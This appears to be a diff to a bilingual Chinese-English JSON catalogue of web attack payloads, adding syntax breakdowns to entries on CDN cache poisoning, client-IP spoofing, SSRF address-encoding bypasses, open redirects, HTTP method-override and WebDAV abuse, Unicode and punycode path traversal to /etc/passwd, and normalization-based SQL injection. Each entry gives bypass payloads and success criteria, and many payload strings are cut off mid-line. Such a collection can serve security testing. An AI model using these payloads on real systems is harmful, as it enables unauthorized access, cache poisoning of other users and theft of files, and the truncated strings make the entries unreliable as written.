+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X_AKAMAI_EDGESCAPE: mark",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -4941,7 +6189,25 @@
           "description": {
             "zh": "Akamai 调试 Pragma 指令变形绕过禁用并泄露缓存键。成功判据：响应头返回真缓存键信息。",
             "en": "Mutated Akamai debug Pragma directives evade disabling and leak cache keys. Success: response headers reveal true cache-key details."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Pragma: Akamai-X-Get-Expir",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Akamai-Transformed: 9",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -4952,7 +6218,25 @@
           "description": {
             "zh": "地理与客户端 IP 头组合改变边缘决策但未入缓存键。成功判据：投毒变体缓存命中。",
             "en": "Geo and client-IP header combos alter edge decisions without entering the cache key. Success: the poisoned variant gets a cache hit."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Akamai-Edgescape: geoloc",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-True-Client-IP: 127.0.",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -5075,7 +6359,25 @@
           "description": {
             "zh": "轮换源站指定头命中未键入的回源取值。成功判据：缓存内容来自攻击者源。",
             "en": "Rotating origin-selection headers hits unkeyed fetch values. Success: cached content comes from the attacker origin."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Fastly-Orig-Host: {ATTACKE",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Orig-Host: {ATTACKER_H",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -5086,7 +6388,25 @@
           "description": {
             "zh": "伪造 X-Varnish 链使边缘认为是内部代理链。成功判据：边缘按内部请求处理并缓存投毒内容。",
             "en": "Forged X-Varnish chains make the edge treat the request as an internal proxy chain. Success: the edge processes it internally and caches poisoned content."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Varnish: 1234567890",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Varnish: 1, 2, 3",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -5097,7 +6417,25 @@
           "description": {
             "zh": "声明代理能力使边缘接受 Surrogate 控制指令覆盖缓存策略。成功判据：按注入的 surrogate 指令缓存。",
             "en": "Declaring surrogate capability makes the edge accept Surrogate directives overriding cache policy. Success: caching follows the injected surrogate directives."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Surrogate-Capability: key=",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "Surrogate-Key: admincont",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -5220,7 +6558,25 @@
           "description": {
             "zh": "单值与链式值变形命中源站取 IP 的不同实现。成功判据：访问控制按伪造 IP 放行。",
             "en": "Single and chained values hit different origin IP-extraction implementations. Success: access control passes per the forged IP."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "CF-Connecting-IP: 127.0.0.",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "CF-Connecting-IP: 10.0.0",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -5231,7 +6587,25 @@
           "description": {
             "zh": "JSON 结构与编码注入改变协议派生。成功判据：响应或跳转按注入 scheme 构造。",
             "en": "JSON structural and encoding injection alters scheme derivation. Success: responses or redirects are built with the injected scheme."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "CF-Visitor: {\"scheme\":\"htt",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "CF-Visitor: {\"scheme\":\"j",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -5242,7 +6616,25 @@
           "description": {
             "zh": "替代头族命中未清洗的派生字段。成功判据：任一头触发边缘决策改变并缓存。",
             "en": "The alternative header family hits unsanitized derivation fields. Success: any header alters edge decisions and gets cached."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "True-Client-IP: 127.0.0.1",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "CF-IPCountry: US,127.0.0",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -5369,7 +6761,17 @@
           "description": {
             "zh": "超长值绕过长度受限的黑名单并触发后端解析失败持久缓存。成功判据：错误响应被缓存分发给其他用户。",
             "en": "Overlong values bypass length-limited blacklists and trigger a persistently cached backend failure. Success: the error response is cached and served to others."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Forwarded-Host: {ATTACKE",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -5380,7 +6782,25 @@
           "description": {
             "zh": "编码 NUL 在解码层截断主机名造成解析异常。成功判据：异常响应进入缓存。",
             "en": "Encoded NULs truncate the hostname at the decode layer causing parse failures. Success: the failure response enters the cache."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Forwarded-Host: {ATTACKE",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Forwarded-Host: %00{AT",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -5391,7 +6811,25 @@
           "description": {
             "zh": "多个未键入头叠加放大后端错误并持久化缓存。成功判据：组合错误响应命中受害键。",
             "en": "Stacking multiple unkeyed headers amplifies backend errors that persist in cache. Success: the combined error response matches victim keys."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Forwarded-Host: nonexist",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Forwarded-Scheme: noth",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -5630,7 +7068,25 @@
           "description": {
             "zh": "RFC 7239 组合参数与多跳变形命中部分解析实现。成功判据：缓存变体投毒命中。",
             "en": "RFC 7239 combined params and multi-hop forms hit partial-parsing implementations. Success: the cache variant poisons a hit."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Forwarded: for=127.0.0.1;h",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "Forwarded: for=127.0.0.1",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -5641,7 +7097,25 @@
           "description": {
             "zh": "轮换客户端 IP 头命中未入键的取值。成功判据：伪造 IP 影响缓存决策。",
             "en": "Rotating client-IP headers hits unkeyed extraction. Success: the forged IP influences cache decisions."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Cluster-Client-IP: 127.0",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-ProxyUser-IP: 127.0.0.",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -5652,7 +7126,25 @@
           "description": {
             "zh": "组合头使缓存键取 XFH 而源站取 Host 实现键错位投毒。成功判据：受害键返回攻击者内容。",
             "en": "Combined headers make the cache key read XFH while the origin reads Host, achieving key misalignment. Success: the victim key returns attacker content."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Host: {ATTACKER_HOST}",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Forwarded-For: 127.0.0",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -5920,7 +7412,25 @@
           "description": {
             "zh": "绕过对 192.168.x.x 点分形式黑名单：网关地址转整数表示；路由器管理页返回即成功。",
             "en": "Represent gateway addresses as integers past dotted blacklists; a router admin page returning confirms success."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "http://3232235521/",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "http://3232235762/",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -5931,7 +7441,25 @@
           "description": {
             "zh": "绕过对十进制私网匹配：八进制写法解析等价；内网服务响应出现即成功。",
             "en": "Use octal notation resolving identically past decimal private-range matching; an internal service response appearing confirms success."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "http://0300.0250.0.1/",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "http://0300.0250.0001.00",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -5942,7 +7470,25 @@
           "description": {
             "zh": "绕过按首个 Host 头取值的校验：叠加第二个 Host 头利用服务器解析差异；返回内网面板即成功。",
             "en": "Stack a second Host header to exploit servers honoring the last value; an internal panel returning confirms success."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "GET / HTTP/1.1",
+              "explanation": {
+                "zh": "GET 请求行与路径",
+                "en": "Request line and path"
+              },
+              "type": "control"
+            },
+            {
+              "part": "Host: benign.example.com\nH",
+              "explanation": {
+                "zh": "Host 头指定目标",
+                "en": "Host header"
+              },
+              "type": "header"
+            }
+          ]
         }
       ]
     },
@@ -6065,7 +7611,25 @@
           "description": {
             "zh": "双重编码的 CR/LF/NUL 在缓存规范化层还原造成键差异。成功判据：投毒键与受害键归并为同一缓存条目。",
             "en": "Double-encoded CR/LF/NUL resolve at cache normalization causing key divergence. Success: poisoned and victim keys merge into one cache entry."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Host: {ATTACKER_HOST}%250d",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "Host: {ATTACKER_HOST}%25",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -6076,7 +7640,25 @@
           "description": {
             "zh": "大小写差异使 WAF 特征不命中而缓存键归一化合并。成功判据：变形投毒命中受害缓存。",
             "en": "Case differences evade WAF signatures while cache keys normalize and merge. Success: the mutated poison hits the victim cache entry."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Host: {ATTACKER_HOST}",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "Host: ATTACKER.HOST",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -6087,7 +7669,25 @@
           "description": {
             "zh": "非常规端口后缀改变键形态但归一化后等价。成功判据：投毒条目命中常规请求。",
             "en": "Unusual port suffixes reshape the key yet normalize equivalently. Success: the poisoned entry matches ordinary requests."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Host: {ATTACKER_HOST}:443",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "Host: {ATTACKER_HOST}:0",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -6210,7 +7810,17 @@
           "description": {
             "zh": "@ 编码为 %40，绕过对原始 @ userinfo 分隔的检测而解析器仍按 userinfo 处理；成功判据：跳转至攻击者域。",
             "en": "Encoding @ as %40 evades raw-userinfo detection while parsers still treat it as a userinfo separator. Success: redirect hits the attacker host."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/redirect?url=https://{TAR",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -6221,7 +7831,17 @@
           "description": {
             "zh": "反斜杠与 @ 组合利用 WHATWG 与 RFC 解析差异，部分栈把反斜杠当斜杠、authority 变更；成功判据：浏览器跳到攻击者域。",
             "en": "The backslash-@ combo exploits WHATWG vs RFC parsing so some stacks change the authority. Success: the browser lands on the attacker host."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/redirect?url=https://{TAR",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -6232,7 +7852,17 @@
           "description": {
             "zh": "多个 @ 使不同解析器取不同 userinfo/host，绕过“最后一个 @ 前”的固定假设；成功判据：任一主流栈完成外域跳转。",
             "en": "Multiple @ signs make parsers disagree on userinfo/host boundaries, defeating the last-@ assumption. Success: any major stack completes the redirect."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/redirect?url=https://{TAR",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -6355,7 +7985,25 @@
           "description": {
             "zh": "大小写变形绕过方法名特征与 ACL 匹配。成功判据：返回管理属性或内容。",
             "en": "Case mutations evade method-name signatures and ACL matching. Success: admin properties or content return."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "propfind /admin HTTP/1.1",
+              "explanation": {
+                "zh": "全小写方法名",
+                "en": "Lowercase method name"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "PROPFIND /admin/ HTTP/1.1",
+              "explanation": {
+                "zh": "尾斜杠方法路径",
+                "en": "Method with trailing slash"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -6366,7 +8014,33 @@
           "description": {
             "zh": "扩展方法携 XML body 绕过只检查标准方法体的防护。成功判据：属性修改成功。",
             "en": "Extended methods carrying XML bodies bypass defenses inspecting only standard method bodies. Success: the property change succeeds."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "PROPPATCH /admin HTTP/1.1",
+              "explanation": {
+                "zh": "PROPPATCH 方法",
+                "en": "PROPPATCH method"
+              },
+              "type": "control"
+            },
+            {
+              "part": "<D:propertyupdate xmlns:D=\"DAV:\">",
+              "explanation": {
+                "zh": "DAV 属性更新体",
+                "en": "DAV property update body"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "<D:owner>attacker</D:owner>",
+              "explanation": {
+                "zh": "改写资源所有者",
+                "en": "Rewrites the owner"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -6377,7 +8051,33 @@
           "description": {
             "zh": "自定义动词或 CalDAV REPORT 落到未授权处理器。成功判据：返回管理数据。",
             "en": "Custom verbs or CalDAV REPORT land on unauthenticated handlers. Success: admin data returns."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-REPORT /admin HTTP/1.1",
+              "explanation": {
+                "zh": "自定义 X-REPORT",
+                "en": "Custom X-REPORT verb"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "REPORT /admin HTTP/1.1",
+              "explanation": {
+                "zh": "REPORT 方法",
+                "en": "REPORT method"
+              },
+              "type": "control"
+            },
+            {
+              "part": "<C:calendar-query xmlns:C=\"urn:ietf:params:xml:ns:caldav\"/>",
+              "explanation": {
+                "zh": "CalDAV 查询体",
+                "en": "CalDAV query body"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -6500,7 +8200,25 @@
           "description": {
             "zh": "重复 _method 使校验层与路由层取值不同。成功判据：以 GET 通过检查后按 DELETE 执行。",
             "en": "Duplicate _method makes validation and routing read different values. Success: passes as GET, executes as DELETE."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "_method=GET&_method=DELETE",
+              "explanation": {
+                "zh": "先 GET 后 DELETE",
+                "en": "GET first, DELETE after"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "_method=DELETE&_method=GET",
+              "explanation": {
+                "zh": "先 DELETE 后 GET",
+                "en": "DELETE first, GET after"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -6511,7 +8229,33 @@
           "description": {
             "zh": "双通道覆盖命中实现读取的任一通道。成功判据：方法被切换执行。",
             "en": "Dual-channel override hits whichever channel the implementation reads. Success: the method is switched and executed."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-X POST",
+              "explanation": {
+                "zh": "外层 POST 方法",
+                "en": "Outer POST method"
+              },
+              "type": "flag"
+            },
+            {
+              "part": "-H \"X-HTTP-Method-Override: DELETE\"",
+              "explanation": {
+                "zh": "头部方法覆盖通道",
+                "en": "Header override channel"
+              },
+              "type": "header"
+            },
+            {
+              "part": "-d \"_method=PUT\"",
+              "explanation": {
+                "zh": "表单方法覆盖通道",
+                "en": "Form override channel"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -6522,7 +8266,33 @@
           "description": {
             "zh": "编码/大小写键名绕过伪方法参数黑名单。成功判据：变形键仍触发覆盖。",
             "en": "Encoded/case-mutated keys bypass pseudo-method blacklists. Success: the mutated key still triggers the override."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "_%6Dethod=DELETE",
+              "explanation": {
+                "zh": "编码 m 的键名",
+                "en": "Key with encoded m"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "_mEtHoD=DELETE",
+              "explanation": {
+                "zh": "混合大小写键名",
+                "en": "Mixed-case key name"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%5Fmethod=DELETE",
+              "explanation": {
+                "zh": "编码下划线键名",
+                "en": "Encoded underscore key"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -6645,7 +8415,33 @@
           "description": {
             "zh": "method 移入 JSON body 绕过查询参数级检查。成功判据：按 DELETE 执行。",
             "en": "Moving method into the JSON body bypasses query-parameter checks. Success: executes as DELETE."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-H \"Content-Type: application/json\"",
+              "explanation": {
+                "zh": "JSON 请求体类型",
+                "en": "JSON body content type"
+              },
+              "type": "header"
+            },
+            {
+              "part": "'{\"method\":\"DELETE\",\"action\":\"delete\",\"verb\":\"DELETE\"}'",
+              "explanation": {
+                "zh": "三键方法请求体",
+                "en": "Three-key method body"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "http://127.0.0.1:8080/admin",
+              "explanation": {
+                "zh": "管理端点",
+                "en": "Admin endpoint"
+              },
+              "type": "url"
+            }
+          ]
         },
         {
           "title": {
@@ -6656,7 +8452,25 @@
           "description": {
             "zh": "数组/嵌套形态使检查与执行取不同元素。成功判据：越权方法被执行。",
             "en": "Array/nested forms make checks and execution read different elements. Success: the unauthorized method executes."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "method[]=DELETE&method[]=GET",
+              "explanation": {
+                "zh": "数组方法参数",
+                "en": "Array method params"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "method[verb]=DELETE&method[check]=GET",
+              "explanation": {
+                "zh": "嵌套方法键",
+                "en": "Nested method keys"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -6667,7 +8481,25 @@
           "description": {
             "zh": "大小写与尾缀变形绕过值特征。成功判据：变形值触发方法切换。",
             "en": "Case and suffix mutations evade value signatures. Success: a mutated value triggers the method switch."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "method=DeLeTe",
+              "explanation": {
+                "zh": "混合大小写方法值",
+                "en": "Mixed-case value"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "method=delete%20HTTP/1.1",
+              "explanation": {
+                "zh": "尾缀变形方法值",
+                "en": "Suffixed method value"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -6790,7 +8622,17 @@
           "description": {
             "zh": "绕过对绝对形式请求行 \"GET http://127.0.0.1\" 字面匹配的代理规则：scheme 大小写在 RFC 下不敏感，主机与路径分别 percent-encode、尾斜杠与点段改变字面而路由目标不变；成功判据：变形请求返回 /admin 内容（与 Host 覆盖原版一致）。",
             "en": "Bypasses proxy rules matching the literal absolute-form line \"GET http://127.0.0.1\": scheme case is insensitive per RFC, separately encoding host and path plus trailing slash/dot segments change literals without changing the route; success criterion: variants return /admin content as the original Host-override request."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "GET hTtP://127.0.0.1/admin",
+              "explanation": {
+                "zh": "GET 请求行与路径",
+                "en": "Request line and path"
+              },
+              "type": "control"
+            }
+          ]
         },
         {
           "title": {
@@ -6801,7 +8643,17 @@
           "description": {
             "zh": "绕过基于 \"127.0.0.1/localhost 字符串\" 的 authority 校验：IPv6 字面量、IPv4 映射地址与整数/十六进制/八进制数值 authority 解析后仍指向本机；成功判据：任一变形取回内部 /admin 资源。",
             "en": "Bypasses authority checks on the 127.0.0.1/localhost strings: IPv6 literals, IPv4-mapped addresses and integer/hex/octal numeric authorities still resolve to the host; success criterion: any variant retrieves the internal /admin resource."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "GET http://[::1]/admin HTT",
+              "explanation": {
+                "zh": "GET 请求行与路径",
+                "en": "Request line and path"
+              },
+              "type": "control"
+            }
+          ]
         },
         {
           "title": {
@@ -6812,7 +8664,17 @@
           "description": {
             "zh": "绕过对 authority 精确匹配的规则：userinfo（@ 前缀）与显式端口（含空口令 :@80、非标 8080）被排除在匹配串外而语义不变；成功判据：变形请求命中同一内部路由。",
             "en": "Bypasses exact authority matching: userinfo prefixes and explicit ports (empty-password :@80, non-standard 8080) sit outside the matched string while preserving semantics; success criterion: variants hit the same internal route."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "GET http://user@127.0.0.1/",
+              "explanation": {
+                "zh": "GET 请求行与路径",
+                "en": "Request line and path"
+              },
+              "type": "control"
+            }
+          ]
         },
         {
           "title": {
@@ -6823,7 +8685,17 @@
           "description": {
             "zh": "绕过末尾字面 \"/admin HTTP/1.1\" 模板匹配：authority 尾点等价、双斜杠路径归一，再以 HTTP/1.0 请求行改写结尾签名；成功判据：任一变形返回 /admin 内容且未被代理拒绝（非 400/403）。",
             "en": "Bypasses matching on the trailing \"/admin HTTP/1.1\" template: trailing-dot authority equivalence, doubled slashes normalizing away, and an HTTP/1.0 request line rewriting the ending signature; success criterion: any variant returns /admin content without proxy rejection (not 400/403)."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "GET http://127.0.0.1./admi",
+              "explanation": {
+                "zh": "GET 请求行与路径",
+                "en": "Request line and path"
+              },
+              "type": "control"
+            }
+          ]
         }
       ]
     },
@@ -6949,7 +8821,25 @@
           "description": {
             "zh": "半全角混合点被规范化还原。判据：读出 passwd。",
             "en": "Mixed full/half dots normalized back. Success: passwd read."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "．./．./etc/passwd",
+              "explanation": {
+                "zh": "全半角混合点序列",
+                "en": "Mixed full-halfwidth dots"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "．",
+              "explanation": {
+                "zh": "全角句点字符",
+                "en": "Fullwidth full stop char"
+              },
+              "type": "value"
+            }
+          ]
         },
         {
           "title": {
@@ -6960,7 +8850,25 @@
           "description": {
             "zh": "全角点再编码双重绕过。判据：200。",
             "en": "Fullwidth dots then percent-encoded. Success: 200."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%uff0e%uff0e/%uff0e%uff0e/etc/passwd",
+              "explanation": {
+                "zh": "编码全角点遍历",
+                "en": "Encoded fullwidth-dot traversal"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%uff0e",
+              "explanation": {
+                "zh": "编码全角句点",
+                "en": "Encoded fullwidth stop"
+              },
+              "type": "value"
+            }
+          ]
         },
         {
           "title": {
@@ -6971,7 +8879,25 @@
           "description": {
             "zh": "换 Windows 目标验证可利用性。判据：读出 boot.ini。",
             "en": "Windows target variant. Success: boot.ini read."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "‥/‥/boot.ini",
+              "explanation": {
+                "zh": "Windows 目标遍历",
+                "en": "Windows target traversal"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "boot.ini",
+              "explanation": {
+                "zh": "Windows 启动配置",
+                "en": "Windows boot config"
+              },
+              "type": "value"
+            }
+          ]
         }
       ]
     },
@@ -7094,7 +9020,25 @@
           "description": {
             "zh": "绕过对半角元字符的过滤并利用归一化差异：全角引号等以 UTF-8 百分号编码传递，应用规范化后还原；数据库报错出现即成功。",
             "en": "Send fullwidth quote/equals as UTF-8 percent encoding to exploit normalization gaps; an appearing database error confirms success."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%EF%BC%87",
+              "explanation": {
+                "zh": "URL百分号编码",
+                "en": "URL percent encoding"
+              },
+              "type": "value"
+            },
+            {
+              "part": "%EF%BC%9D",
+              "explanation": {
+                "zh": "全角等号编码",
+                "en": "Fullwidth equals encoding"
+              },
+              "type": "value"
+            }
+          ]
         },
         {
           "title": {
@@ -7105,7 +9049,25 @@
           "description": {
             "zh": "绕过对标准引号字符集的封锁：用 U+02BC 修饰字母撇号参与规范化还原；谓词生效引发差异即成功。",
             "en": "Use the U+02BC modifier apostrophe to survive quote charset bans via normalization; an effective predicate causing a delta confirms success."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%CA%BC",
+              "explanation": {
+                "zh": "URL百分号编码",
+                "en": "URL percent encoding"
+              },
+              "type": "value"
+            },
+            {
+              "part": "--",
+              "explanation": {
+                "zh": "SQL行注释符",
+                "en": "SQL line comment"
+              },
+              "type": "comment"
+            }
+          ]
         },
         {
           "title": {
@@ -7116,7 +9078,25 @@
           "description": {
             "zh": "绕过对全角串整体匹配的规则：半角全角混排使特征不完整；登录或查询行为异常即成功。",
             "en": "Mix halfwidth and fullwidth so signatures never fully match; anomalous login or query behavior confirms success."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "＇",
+              "explanation": {
+                "zh": "全角Unicode变体",
+                "en": "Fullwidth Unicode variant"
+              },
+              "type": "value"
+            },
+            {
+              "part": "'1'='1",
+              "explanation": {
+                "zh": "字符串恒真比较",
+                "en": "String tautology"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -7395,7 +9375,25 @@
           "description": {
             "zh": "前缀加编码遍历组合。判据：读出 passwd。",
             "en": "Prefix plus encoded traversal. Success: passwd read."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "xn--",
+              "explanation": {
+                "zh": "Punycode 前缀",
+                "en": "Punycode prefix"
+              },
+              "type": "value"
+            },
+            {
+              "part": "xn--%2f..%2f..%2fetc%2fpasswd",
+              "explanation": {
+                "zh": "前缀加编码遍历",
+                "en": "Prefix plus encoded traversal"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -7406,7 +9404,25 @@
           "description": {
             "zh": "大小写混写。判据：200。",
             "en": "Case variance. Success: 200."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "XN--",
+              "explanation": {
+                "zh": "大写前缀",
+                "en": "Uppercase prefix"
+              },
+              "type": "value"
+            },
+            {
+              "part": "XN--/../../boot.ini",
+              "explanation": {
+                "zh": "大写前缀遍历",
+                "en": "Uppercase-prefixed traversal"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -7417,7 +9433,25 @@
           "description": {
             "zh": "以真实 IDN 前缀混淆规则。判据：遍历成功。",
             "en": "Real IDN prefix confuses rules. Success: traversal works."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "xn--p1ai",
+              "explanation": {
+                "zh": "合法 Punycode 标签",
+                "en": "Valid punycode label"
+              },
+              "type": "value"
+            },
+            {
+              "part": "xn--p1ai/../../etc/passwd",
+              "explanation": {
+                "zh": "真实 IDN 前缀遍历",
+                "en": "Real-IDN prefixed traversal"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
